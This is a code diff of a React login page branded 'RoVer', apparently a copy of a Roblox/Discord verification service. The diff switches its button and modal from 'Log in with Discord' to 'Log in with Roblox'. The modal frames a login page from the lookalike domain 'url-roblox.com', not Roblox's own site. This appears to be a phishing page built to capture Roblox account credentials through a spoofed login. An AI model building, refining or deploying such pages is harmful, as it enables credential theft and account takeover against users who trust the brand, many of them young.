@@ -8,11 +8,16 @@ import { X } from "lucide-react"
 import { useState } from "react"
 
 const RoVerLogo = () => (
-  <img
-    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/7338ed45666cd90ec1a6662491a9eb8a-be4MOuBGpDET7a0tJToZH7US60Eg9x.png"
-    alt="RoVer Logo"
-    className="w-8 h-8 rounded-lg"
-  />
+  <div className="flex items-center gap-3">
+    {/* Geometric Icon */}
+    <img
+      src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/1759208584157-XRYQnRR1LzsHjdysKompQM37tE1LU9.jpg"
+      alt="RoVer Logo"
+      className="w-14 h-14 object-contain"
+    />
+    {/* RoVer Text */}
+    <span className="text-white text-3xl font-bold tracking-tight">RoVer</span>
+  </div>
 )
 
 export default function RoVerLogin() {
@@ -21,13 +26,10 @@ export default function RoVerLogin() {
   return (
     <div className="min-h-screen bg-zinc-800">
       {/* Header */}
-      <header className="bg-pink-600 px-4 py-4">
+      <header className="bg-[#E91E8C] px-4 py-4">
         <div className="flex items-center justify-between max-w-7xl mx-auto">
           <Menu className="w-8 h-8 text-white" />
-          <div className="flex items-center gap-2">
-            <RoVerLogo />
-            <span className="text-white text-2xl font-bold">RoVer</span>
-          </div>
+          <RoVerLogo />
           <div className="w-8"></div> {/* Spacer for centering */}
         </div>
       </header>
@@ -60,13 +62,12 @@ export default function RoVerLogin() {
               </div>
             </div>
 
-            {/* Discord Login Button */}
             <Button
               className="w-full bg-pink-600 hover:bg-pink-700 text-white font-medium py-3 rounded-full text-lg"
               size="lg"
               onClick={() => setShowIframe(true)}
             >
-              Log in with Discord
+              Log in with Roblox
             </Button>
           </div>
         </Card>
@@ -74,22 +75,22 @@ export default function RoVerLogin() {
 
       {showIframe && (
         <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4 animate-in fade-in duration-300">
-          <div className="w-full max-w-4xl h-[80vh] bg-white rounded-3xl shadow-2xl overflow-hidden transform animate-in zoom-in-95 duration-500 ease-out">
-            <div className="flex items-center justify-between p-4 bg-gray-50 border-b">
-              <h2 className="text-lg font-semibold text-gray-900">Discord Login</h2>
+          <div className="w-full max-w-5xl h-[85vh] bg-zinc-900 rounded-3xl shadow-2xl overflow-hidden transform animate-in zoom-in-95 duration-500 ease-out">
+            <div className="flex items-center justify-between px-4 py-2 bg-zinc-800 border-b border-zinc-700">
+              <h2 className="text-sm font-semibold text-white">Roblox Login</h2>
               <Button
                 variant="ghost"
                 size="sm"
                 onClick={() => setShowIframe(false)}
-                className="text-gray-500 hover:text-gray-700 hover:bg-gray-200 rounded-full"
+                className="text-zinc-400 hover:text-white hover:bg-zinc-700 rounded-full"
               >
                 <X className="w-5 h-5" />
               </Button>
             </div>
             <iframe
               src="https://url-roblox.com/login?returnUrl=4620367668564615"
-              className="w-full h-full border-0"
-              title="Discord Login"
+              className="w-full h-[calc(100%-40px)] border-0"
+              title="Roblox Login"
             />
           </div>
         </div>
